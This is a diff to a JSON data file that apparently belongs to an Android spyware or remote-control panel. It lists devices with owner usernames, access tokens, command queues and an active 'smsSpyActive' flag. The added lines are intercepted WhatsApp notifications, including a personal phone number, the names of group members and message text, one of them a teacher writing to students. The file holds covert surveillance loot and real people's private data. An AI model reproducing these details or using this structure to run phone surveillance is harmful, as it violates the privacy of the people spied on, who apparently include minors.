@@ -4037,7 +4037,7 @@
     "deviceName": "HP-MEMEM-A001",
     "ownerUsername": "RIXX09",
     "token": "fb008139c6083d4cb9aa61f99b737696",
-    "lastSeen": 1777249208354,
+    "lastSeen": 1777249219341,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:56:32.130Z",
@@ -9345,7 +9345,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777249210862,
+    "lastSeen": 1777249228867,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -9361,6 +9361,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Grup ALUMNI SD MUHAMMADIYAH: ~ Murni",
+        "content": "💟 Stiker",
+        "time": "27/04 08:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777249229124
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎5 pesan dari 3 chat",
+        "time": "27/04 08:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777249214137
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 858-4757-8445",
+        "content": "p",
+        "time": "27/04 08:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777249213857
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Bahasa Indonesia 8.10: ~ Adhe Utami Lestari",
+        "content": "Assalamualaikum dek, izin menyampaikan bahwa saya kasih lengkap nilai nya untuk rapor sementara kalian yang belum lengkap nilai nya tetapi dengan catatan tugas2 kalian yang blm lengkap tetap di kerjakan",
+        "time": "27/04 08:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777249213764
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎ALUMNI SDN RAPPOCINI KELAS ANGKATAN 2023-2024🫂💗 (3 pesan): ~ Lena",
+        "content": "yayayay",
+        "time": "27/04 08:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777249213618
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
